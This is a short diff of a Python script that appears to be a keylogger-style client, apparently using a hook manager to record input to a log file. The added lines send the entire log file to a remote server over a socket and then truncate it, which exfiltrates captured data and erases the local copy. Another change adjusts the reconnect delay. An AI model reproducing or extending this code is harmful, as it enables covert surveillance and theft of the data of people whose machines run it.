@@ -523,9 +523,11 @@ if __name__ == '__main__':
         flag = connect_socket(sock_addr)
         if flag == True:
             print("Connected.\nSending To Server")
-            if flag_2 == True:
-                hm.cancel(flag,flag_2)
             hm.start()
+            fopen = open(log_file,'r+b')
+            client_sock.sendfile(fopen)
+            fopen.truncate(0)
+            fopen.close()
             while True:
                 time.sleep(0)
         elif flag == False:
@@ -533,7 +535,7 @@ if __name__ == '__main__':
             hm.start()
             while (not flag):
                 #flag = connect_socket(sock_addr)
-                time.sleep(0)
+                time.sleep(10)
     except KeyboardInterrupt:
         hm.cancel(flag,flag_2)
 #    hm.start()
